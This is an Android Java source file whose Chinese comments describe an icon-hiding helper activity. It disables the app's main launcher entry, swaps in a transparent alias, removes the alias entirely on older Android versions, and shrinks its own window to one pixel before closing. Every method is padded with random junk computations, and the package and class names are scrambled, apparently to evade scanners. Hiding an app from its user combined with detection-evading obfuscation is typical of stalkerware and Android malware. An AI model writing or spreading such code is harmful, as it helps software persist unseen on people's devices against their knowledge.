package thg.zzcjg.nnvmr;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（VECW），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class XQJT extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        long arr_MAFaAWE = java.lang.System.nanoTime();
        int i_yqAgJfYgHwkJ = new java.util.Random().nextInt(1000);
        boolean j_WGwEeeejEpRyabBuR = (arr_MAFaAWE % (i_yqAgJfYgHwkJ + 97)) > 3;
        double tmp_OCSamuwnPNDqbA = j_WGwEeeejEpRyabBuR ? java.lang.Math.sqrt(i_yqAgJfYgHwkJ) : java.lang.Math.pow(i_yqAgJfYgHwkJ, 11);
        if (tmp_OCSamuwnPNDqbA < 0.0) {
            java.lang.System.out.println(tmp_OCSamuwnPNDqbA);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(XQJT.this, VECW.class.getName(), "thg.zzcjg.nnvmr.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(XQJT.this, "thg.zzcjg.nnvmr.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_MAFaAWE = java.lang.System.nanoTime();
        int i_yqAgJfYgHwkJ = new java.util.Random().nextInt(1000);
        boolean j_WGwEeeejEpRyabBuR = (arr_MAFaAWE % (i_yqAgJfYgHwkJ + 97)) > 3;
        double tmp_OCSamuwnPNDqbA = j_WGwEeeejEpRyabBuR ? java.lang.Math.sqrt(i_yqAgJfYgHwkJ) : java.lang.Math.pow(i_yqAgJfYgHwkJ, 11);
        if (tmp_OCSamuwnPNDqbA < 0.0) {
            java.lang.System.out.println(tmp_OCSamuwnPNDqbA);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onaCMedOA = java.util.UUID.randomUUID().toString();
        int ckuyPvyguAYxFWOZma = onaCMedOA.length();
        char pmh_tPnSNOChXs = onaCMedOA.charAt(new java.util.Random().nextInt(ckuyPvyguAYxFWOZma));
        boolean dimaaGAYEXmmDSorGe = (pmh_tPnSNOChXs == 'z');
        if (dimaaGAYEXmmDSorGe && ckuyPvyguAYxFWOZma < 64) {
            onaCMedOA.substring(35, 2);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        java.lang.Object arr_RyUOisBzprNewHZ = new java.lang.Object();
        int i_mOxadYEELQ = arr_RyUOisBzprNewHZ.hashCode();
        int j_csYzDViSmPFUKR = new java.util.Random().nextInt(100);
        int tmp_hoDFyclwfFptTCW = (i_mOxadYEELQ ^ j_csYzDViSmPFUKR) & 0x7FFFFFFF;
        if (tmp_hoDFyclwfFptTCW == 28 && i_mOxadYEELQ < 96) {
            arr_RyUOisBzprNewHZ.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
